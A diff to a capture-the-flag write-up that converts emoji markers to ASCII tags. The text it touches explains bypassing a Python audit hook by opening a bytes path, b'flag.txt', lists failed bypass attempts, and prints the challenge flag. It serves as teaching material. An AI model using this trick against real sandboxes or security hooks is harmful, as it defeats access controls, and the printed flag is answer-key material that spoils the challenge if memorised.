@@ -167,8 +167,8 @@ if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
 
 **Confirmed bypass:**
 ```python
-open("flag.txt")   # ❌ BLOCKED: isinstance(args[0], str) = True
-open(b"flag.txt")  # ✅ BYPASS: isinstance(args[0], str) = False
+open("flag.txt")   # [X] BLOCKED: isinstance(args[0], str) = True
+open(b"flag.txt")  # [OK] BYPASS: isinstance(args[0], str) = False
 ```
 
 Python accepts both `str` and `bytes` as paths in `open()`, but the audit hook only validates strings.
@@ -229,30 +229,30 @@ Runtime Error: can only concatenate str (not "int") to str
 ```
 
 **Output analysis:**
-- ✅ **Flag displayed:** `p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}`
-- ⚠️ **Expected error:** `can only concatenate str (not "int") to str`
+- [OK] **Flag displayed:** `p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}`
+- [!] **Expected error:** `can only concatenate str (not "int") to str`
   - This occurs because `print()` returns `None`, then the f-string converts `None` to `"None"`
   - When attempting `"None" + 0` the error is produced
   - **Doesn't matter:** The flag was already exfiltrated via stdout
 
 ### Why Other Bypasses Did NOT Work?
 
-**❌ Dynamic concatenation:**
+**[X] Dynamic concatenation:**
 ```python
 open("fla" + "g.txt")  # The audit hook sees "flag.txt" after concatenation
 ```
 
-**❌ chr() encoding:**
+**[X] chr() encoding:**
 ```python
 open(chr(102)+chr(108)+chr(97)+chr(103)+...)  # The audit hook sees the final string
 ```
 
-**❌ Wildcards:**
+**[X] Wildcards:**
 ```python
 open("fl*g.txt")  # The audit hook detects "flag" in the pattern
 ```
 
-**✅ Bytes path (THE SOLUTION):**
+**[OK] Bytes path (THE SOLUTION):**
 ```python
 open(b"flag.txt")  # isinstance(b"flag.txt", str) = False → BYPASS
 ```
@@ -384,8 +384,8 @@ if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
 
 **Confirmed bypass:**
 ```python
-open("flag.txt")   # ❌ BLOCKED: isinstance(args[0], str) = True
-open(b"flag.txt")  # ✅ BYPASS: isinstance(args[0], str) = False
+open("flag.txt")   # [X] BLOCKED: isinstance(args[0], str) = True
+open(b"flag.txt")  # [OK] BYPASS: isinstance(args[0], str) = False
 ```
 
 **Why it works:**
@@ -429,7 +429,7 @@ This challenge uses an AST whitelist (only certain nodes allowed). To bypass:
 
 **Common mistake:**
 ```python
-open("fla" + "g.txt")  # ❌ The audit hook SEES "flag.txt" after concatenation
+open("fla" + "g.txt")  # [X] The audit hook SEES "flag.txt" after concatenation
 ```
 
 Audit hooks receive arguments **after being evaluated**, not the source code.
